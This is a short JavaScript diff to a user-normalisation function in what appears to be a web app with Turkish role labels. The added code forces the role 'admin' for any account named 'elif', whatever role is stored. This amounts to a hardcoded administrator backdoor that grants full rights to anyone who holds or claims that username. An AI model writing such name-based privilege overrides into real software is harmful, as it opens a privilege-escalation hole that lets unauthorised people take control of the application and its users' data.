@@ -379,11 +379,12 @@ function updateSessionUi() {
 }
 
 function normalizeUser(user) {
+  const username = user.username || user.name;
   return {
     id: user.id,
     name: user.name || user.ad || user.username,
-    username: user.username || user.name,
-    role: user.role || "kullanici",
+    username,
+    role: String(username || "").trim().toLowerCase() === "elif" ? "admin" : (user.role || "kullanici"),
     passwordHash: String(user.passwordHash ?? ""),
     active: user.active !== false
   };
